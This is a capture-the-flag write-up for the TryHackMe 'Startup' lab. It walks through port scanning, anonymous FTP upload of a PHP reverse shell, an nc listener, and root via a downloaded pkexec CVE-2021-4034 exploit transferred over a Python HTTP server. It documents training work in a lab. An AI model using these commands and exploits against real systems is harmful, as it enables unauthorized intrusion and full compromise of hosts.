---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/startup/","tags":["CTF","write-up"]}
---

![Pasted image 20240926192837.png|300](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926192837.png)
Abuse traditional vulnerabilities via untraditional means.
**We are Spice Hut,** a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

---
# Active reconnaisance
## Enum ports and services
Running a general scan
```shell
sudo nmap 10.10.100.226 -sS -n -p- --min-rate 5000 -vvv -Pn --open
```

```c
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

---
# Vuln analisis
Running a focused scan
```shell
sudo nmap 10.10.100.226 -sCV -p 21,22,80
```

## Port 22
```c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
```
From launchpad probabbly Ubuntu Xenial Xerus 16.04
![Pasted image 20240927085755.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927085755.png)

## Port 21
```c
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.6.2.59
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```
### Download the files
Connecting, set the name `ftp` or `anonymous` and the password empty.
```shell
ftp IP
ftp
```
Now we see the files.
![Pasted image 20240927215100.png|500](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927215100.png)

To download them.
```shell
get filename.txt
```
## Port 80
```c
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
### Fuzzing
```shell
wfuzz -c -t 10 --hc=404,403 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://startup.thm/files/FUZZ
```
After fuzz we foudn only the `files ` subdirectory
![Pasted image 20240927152857.png|300](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927152857.png)
And the ftp folder it's empty.

---
# Exploitation
## Port 21 write access
Test if we can write into the ftp folder.
We can't write into the main folder but we can do it into `ftp` folder.
![Pasted image 20240927153044.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927153044.png)
## Port 80
We create an reveseshell using https://www.revshells.com/ PHP PentestMonkey
And put that file.

Set the listener on the attacker machine
```shell
rlwrap nc -lnvp 4747
```
And go to the file in the browser. http://startup.thm/files/ftp/rev_shell_1.php
And we have the shell.
![Pasted image 20240927153415.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927153415.png)
Get a better shell
```python
python -c  'import pty;pty;spawn("/bin/bash")'
```

> [!check] What is the secret spicy soup recipe?
![Pasted image 20240927155826.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927155826.png)

---
# Privilege Escalation
Check the [[Operative System/Linux/Permisos/SUID\|SUID]] files.
![Pasted image 20240927171405.png|600](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927171405.png)
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



> [!cite] NIST-CVE-2021-4034
> A local privilege escalation vulnerability was found on polkit's **pkexec** utility. The pkexec application is a **setuid** tool designed to allow unprivileged users to **run commands as privileged users** according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

We have `pkexec`with SUID the bit enabled.
The exploit https://github.com/Almorabea/pkexec-exploit
```shell
wget https://raw.githubusercontent.com/Almorabea/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
```
Or the code [[CVE-2021-4034-exploit\|CVE-2021-4034-exploit]]

And transfer to the victim machine

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Transfer files
On the folder that contain the file to send **on the source machine.** E.g. `file.txt`
```python
python -m http.server 4545
```

On the destination machine
```shell
wget http://IP_SOURCE_MACHINE:4545/file.txt
```

</div></div>


Run the exploit
```shell
python3 CVE-2021-4034.py
```


</div></div>

We have the root shell
![Pasted image 20240927161322.png|500](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927161322.png)

> [!check] user.txt
> ![Pasted image 20240927171747.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927171747.png)


> [!check] root.txt
> ![Pasted image 20240927171845.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240927171845.png)



---